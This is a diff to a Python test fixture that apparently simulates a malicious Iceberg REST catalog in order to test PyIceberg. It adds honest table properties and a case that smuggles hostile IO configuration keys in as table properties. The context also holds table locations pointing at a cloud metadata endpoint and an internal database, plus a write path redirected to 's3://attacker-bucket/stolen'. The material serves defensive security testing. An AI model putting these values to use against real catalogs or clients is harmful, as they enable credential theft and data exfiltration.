@@ -50,6 +50,15 @@ _HOSTILE_VALUES = {
 }
 
 
+# Properties a table may honestly carry and the host lets PyIceberg see.
+HONEST_PROPERTIES = {
+    "write.format.default": "parquet",
+    "commit.retry.min-wait-ms": "10",
+    "schema.name-mapping.default": "[]",
+    "gc.enabled": "true",
+}
+
+
 def config_response() -> dict[str, object]:
     """`GET /v1/config`: defaults and overrides that carry the hostile keys next to the two honest ones."""
     return {
@@ -87,6 +96,13 @@ def table_responses() -> dict[str, dict[str, object]]:
         "honest": table_response(f"{WAREHOUSE}/sales/orders"),
         "metadata-service": table_response(f"http://{METADATA_SERVICE}/latest/meta-data/"),
         "platform-database": table_response(f"postgresql://{PLATFORM_DATABASE}:5432/sagat"),
+        # the keys of the catalog's own configuration, sent as properties of the table: PyIceberg merges a table's
+        # properties over the catalog's when it builds the file IO
+        "io-in-properties": table_response(
+            f"{WAREHOUSE}/sales/orders",
+            config=vended_credentials(),
+            properties={**HONEST_PROPERTIES, **_HOSTILE_VALUES},
+        ),
         "redirected-data": table_response(
             f"{WAREHOUSE}/sales/orders",
             properties={"write.data.path": "s3://attacker-bucket/stolen", "write.metadata.path": f"{WAREHOUSE}/m"},
